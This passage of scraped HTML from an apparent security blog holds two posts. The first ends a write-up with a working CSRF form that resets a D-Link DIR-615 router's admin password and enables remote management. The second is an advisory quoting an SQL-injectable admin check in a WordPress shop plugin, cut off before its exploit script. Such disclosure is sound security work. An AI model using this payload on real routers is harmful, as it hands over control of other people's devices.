class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa5667379307626-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5667379307626-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa5667379307626-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"adminForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/tools_admin.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"tools_admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password1"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password2"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"hostname"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"REMOTEENABLED"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"graphical_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_http_management_port"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"2121"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_inbound_filter"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"11"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-10"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">form</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-12"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-i">doFormSubmit</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">doFormSubmit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">adminForm</span><span class="crayon-sy">.</span><span class="crayon-e">submit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa5667379307626-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5667379307626-18"><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0072 seconds] -->
<p>The key here is that while the first login iFrame is loaded straight away, we have to wait to make sure that the request happened. This could be anything from 5ms to a second. In this case, we wait 5000ms to be safe. This could likely be lowered a lot.</p>
<p>This was validated against the EU version of the D-Link DIR-615 with 8.0A firmware. And while it probably could be optimized quite a bit and made a lot prettier/subtle, it addresses something which I couldn&#8217;t find a solution to easily on Google/WAHHv2. This could potentially be a lot simpler against a target that accepts a GET requests to do the same. But this will work for both by simply changing the method in the form.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/csrf/" rel="tag">CSRF</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/#comments" title="Comment on Two-stage CSRF attacks">6 Comments</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-142 -->

				
					
<article id="post-128" class="post-128 post type-post status-publish format-standard hentry category-advisories tag-wordpress-plugin tag-zingiri-web-shop">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/" title="12:36 am" rel="bookmark" class="entry-date"><time datetime="2012-08-20T00:36:24+00:00" pubdate>August 20, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/" title="Permalink to WordPress Zingiri Shop SQL injection vulnerabilities" rel="bookmark">WordPress Zingiri Shop SQL injection vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory<br />
</strong><a href="http://secunia.com/advisories/49398/">Secunia Advisory SA 49398</a></p>
<p><strong>Analysis of  vulnerability</strong></p>
<p>This vulnerability relies on a lack of validation in the Zingiri Web Shops IsAdmin function in <a href="http://plugins.svn.wordpress.org/zingiri-web-shop/tags/2.4.3/fws/includes/subs.inc.php">/fws/includes/subs.inc.php</a> from the fws_cust cookies. The method tries to determine if the user is an admin like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa6565558487057" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// is the id of an admin?
Function IsAdmin() {
	Global $dbtablesprefix,$integrator;

	if ($integrator-&gt;isAdmin()) return true;
	//joomla
	if (wsCurrentCmsUserIsShopAdmin()) return true;

	if (function_exists('wsLiveIsAdmin') &amp;&amp; wsLiveIsAdmin()) return true;

	if (!isset($_COOKIE['fws_cust'])) { return false; }
	$fws_cust = explode("#", $_COOKIE['fws_cust']);
	$customerid = $fws_cust[1];
	$md5pass = $fws_cust[2];
	if (is_null($customerid)) { return false; }
	$f_query = "SELECT * FROM ".$dbtablesprefix."customer WHERE ID = " . $customerid;
	if ($f_sql = mysql_query($f_query)) {
		while ($f_row = mysql_fetch_row($f_sql)) {
			if ($f_row[13] == "ADMIN" &amp;&amp; md5($f_row[2]) == $md5pass)
			{
				if ($f_row[6] == GetUserIP()) {
					return true; }
					else {
						return false; }
			} else
			{
				return false;
			}
		}
	}
	return false;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-220">220</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-221">221</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-222">222</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-223">223</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-224">224</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-225">225</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-226">226</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-227">227</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-228">228</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-229">229</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-230">230</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-231">231</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-232">232</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-233">233</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-234">234</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-235">235</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-236">236</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-237">237</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-238">238</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-239">239</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-240">240</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-241">241</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-242">242</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-243">243</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-244">244</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-245">245</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-246">246</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-247">247</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-248">248</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-249">249</div><div class="crayon-num" data-line="crayon-53c98e7aa6565558487057-250">250</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6565558487057-251">251</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa6565558487057-220"><span class="crayon-c">// is the id of an admin?</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-221"><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">IsAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-222"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">Global</span><span class="crayon-h"> </span><span class="crayon-v">$dbtablesprefix</span><span class="crayon-sy">,</span><span class="crayon-v">$integrator</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-223">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-224"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$integrator</span><span class="crayon-o">-&gt;</span><span class="crayon-e">isAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-225"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//joomla</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-226"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">wsCurrentCmsUserIsShopAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-227">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-228"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">function_exists</span><span class="crayon-sy">(</span><span class="crayon-s">'wsLiveIsAdmin'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">wsLiveIsAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-229">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-230"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_COOKIE</span><span class="crayon-sy">[</span><span class="crayon-s">'fws_cust'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-231"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$fws_cust</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"#"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$_COOKIE</span><span class="crayon-sy">[</span><span class="crayon-s">'fws_cust'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-232"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$customerid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$fws_cust</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-233"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$md5pass</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$fws_cust</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-234"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_null</span><span class="crayon-sy">(</span><span class="crayon-v">$customerid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-235"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$f_query</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$dbtablesprefix</span><span class="crayon-sy">.</span><span class="crayon-s">"customer WHERE ID = "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-v">$customerid</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-236"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_query</span><span class="crayon-sy">(</span><span class="crayon-v">$f_query</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-237"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_fetch_row</span><span class="crayon-sy">(</span><span class="crayon-v">$f_sql</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-238"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-sy">[</span><span class="crayon-cn">13</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"ADMIN"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">md5</span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">$md5pass</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-239"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-240"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-sy">[</span><span class="crayon-cn">6</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-e">GetUserIP</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-241"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-242"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-243"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-244"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-245"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-246"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-247"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-248"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-249"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa6565558487057-250"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6565558487057-251"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0129 seconds] -->
<p>It splits(Explode!!) the fws_cust cookie by the # character, extracts a md5&#8242;ed password and an userID, and then fetches the corresponding user in the database. Notice however on line 232 and 235 that it does not sanitize the input, leading to a SQL injection. We can abuse this to forge a cookie which gives us admin rights using this simple python script:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa6576268587045" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Python</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
